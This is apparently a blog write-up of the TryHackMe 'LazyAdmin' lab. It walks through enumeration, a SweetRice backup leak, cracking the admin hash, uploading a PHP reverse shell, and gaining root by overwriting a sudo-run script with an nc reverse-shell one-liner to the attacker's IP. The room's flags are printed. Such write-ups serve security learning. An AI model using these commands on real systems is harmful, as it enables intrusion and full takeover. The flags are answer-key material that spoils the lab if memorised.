---
title: TryHackMe - LazyAdmin
date: 2022-11-22 15:35:00 +0530
categories: [TryHackMe]
tags: [tryhackme, Easy]
---

-------

## Recon and Enumeration

We can start by adding the IP and name to `/etc/hosts`
Starting the Nmap scan.

```bash
sudo nmap -sC -sV -A -p22,80 lazy.thm
: <<"END"
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-23 00:19 EST
Nmap scan report for lazy.thm (10.10.106.144)
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 497cf741104373da2ce6389586f8e0f0 (RSA)
|   256 2fd7c44ce81b5a9044dfc0638c72ae55 (ECDSA)
|_  256 61846227c6c32917dd27459e29cb905e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 3.10 - 3.13 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   25.14 ms  10.17.0.1
2   ... 4
5   149.49 ms lazy.thm (10.10.106.144)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.33 seconds
END
```

From **nmap** scan, we know that HTTP server is running on port **80**. so we can browse to **http://lazy.thm:80**. it is default apache ubuntu landing page.

![lazyadmin pic](/assets/img/thm_lazyadmin/1.png)

Now, i have started `gobuster`  for directory scanning.

```bash
gobuster dir -u http://lazy.thm -w /usr/share/wordlists/dirb/common.txt
: <<"END"
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://lazy.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/11/23 00:22:00 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 273]
/.htpasswd            (Status: 403) [Size: 273]
/.htaccess            (Status: 403) [Size: 273]
/content              (Status: 301) [Size: 306] [--> http://lazy.thm/content/]
/index.html           (Status: 200) [Size: 11321]
/server-status        (Status: 403) [Size: 273]
Progress: 4613 / 4615 (99.96%)===============================================================
2022/11/23 00:23:12 Finished
===============================================================
END
```

From above scan, we got to know about `http://lazy.thm/content/`. Browsing to it.

![lazyadmin pic](/assets/img/thm_lazyadmin/2.png)

SweetRice is a website management system. From searching in google, i came to know that `/as` can be a login page. browsing to `http://lazy.thm/content/as/` , it is a login page.

![lazyadmin pic](/assets/img/thm_lazyadmin/3.png)

At this point, i have decided to redo directory enumeration on `/as` as well.

```bash
gobuster dir -u http://lazy.thm/content/as -w /usr/share/wordlists/dirb/common.txt
: <<"END"
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://lazy.thm/content/as
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/11/23 00:56:05 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 273]
/.htaccess            (Status: 403) [Size: 273]
/.htpasswd            (Status: 403) [Size: 273]
/index.php            (Status: 200) [Size: 3668]
/js                   (Status: 301) [Size: 312] [--> http://lazy.thm/content/as/js/]
/lib                  (Status: 301) [Size: 313] [--> http://lazy.thm/content/as/lib/]
Progress: 4598 / 4615 (99.63%)===============================================================
2022/11/23 00:57:16 Finished
===============================================================
END
```

From above, we have found that `/js` and `/lib` also exist.  Nothing juicy here.

Using `searchsploit` to look for `SweetRice`, we get 

```bash
searchsploit SweetRice
: <<"END"
-------------------------------------------------- ---------------------------------
 Exploit Title                                    |  Path
-------------------------------------------------- ---------------------------------
SweetRice 0.5.3 - Remote File Inclusion           | php/webapps/10246.txt
SweetRice 0.6.7 - Multiple Vulnerabilities        | php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File Download         | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload           | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure               | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery      | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PH | php/webapps/40700.html
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File Up | php/webapps/14184.txt
-------------------------------------------------- ---------------------------------
Shellcodes: No Results
END
```

## Initial Shell


After digging through above results, we have one exploit that can help us. i.e `SweetRice 1.5.1 - Backup Disclosure`. It explains that there might be mysql backups in `http://lazy.thm/content/inc/mysql_backup/`

![lazyadmin pic](/assets/img/thm_lazyadmin/4.png)

After downloading the above mysql backup and opening it, we get username as `manager` and password in MD5.

![lazyadmin pic](/assets/img/thm_lazyadmin/5.png)

> 42f749ade7f9e195bf475f37a44cafcb

Using [crackstation.net](https://crackstation.net) we can crack this MD5 hash. it is cracked as `Password123`. so we have **manager** and his password. lets try logging into website.

> manager : Password123

We have logged into the website. Initially, website status and url rewrite options were disabled. i have enabled them. 

![lazyadmin pic](/assets/img/thm_lazyadmin/6.png)

we can see Sweet rice version is `1.5.1`.

we can browse to **Ads** in **Dashboard** menu to upload our **php-reverse-shell code**.

![lazyadmin pic](/assets/img/thm_lazyadmin/7.png)

After adding the code, start the netcat listener with `nc -lnvp 1234` on port mentioned in the upload code.

Now browse to `http://lazy.thm/content/inc/ads/php-reverse-shellphp.php` to get a shell in netcat as `www-data`

![lazyadmin pic](/assets/img/thm_lazyadmin/8.png)

We can upgrade to a better shell using python.
`python -c 'import pty; pty.spawn("/bin/bash")'`

As, `www-data`, we can read the **user** flag.
```bash
cat /home/itguy/user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
```
## Privilege Escalation

Moving to directory `/home/itguy`, There is another file in `mysql_login.txt` with content as below. 
> rice:randompass

Lets check if `www-data` can run commands as `root` without password.

```bash
sudo -l
: <<"END"
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
END
```

From above, we can expect that we can run `backup.pl` with `perl` as root. Lets see the code in `backup.pl`.

```perl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

lets see what's in `/etc/copy.sh`
```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```
{: file='/etc/copy.sh'}

`vi` and `vim` editors were not found to be installed. Not enough permissions to run `nano`. We can use `echo` to modify the files, to use `nc` to connect to our second  `netcat listener`.

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.7.122 1235 >/tmp/f" > /etc/copy.sh
```

```bash
# starting another netcat listener on port 1235
nc -lnvp 1235
```

Now, run `backup.pl` with `perl` with **sudo** and we should pop another shell on port 1235 as root.

`sudo /usr/bin/perl /home/itguy/backup.pl`

We can print root flag now.
```
nc -lnvp 1235
listening on [any] 1235 ...
connect to [10.17.7.122] from (UNKNOWN) [10.10.87.105] 58062
/bin/sh: 0: can't access tty; job control turned off
whoami
root
# cat /root/root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```


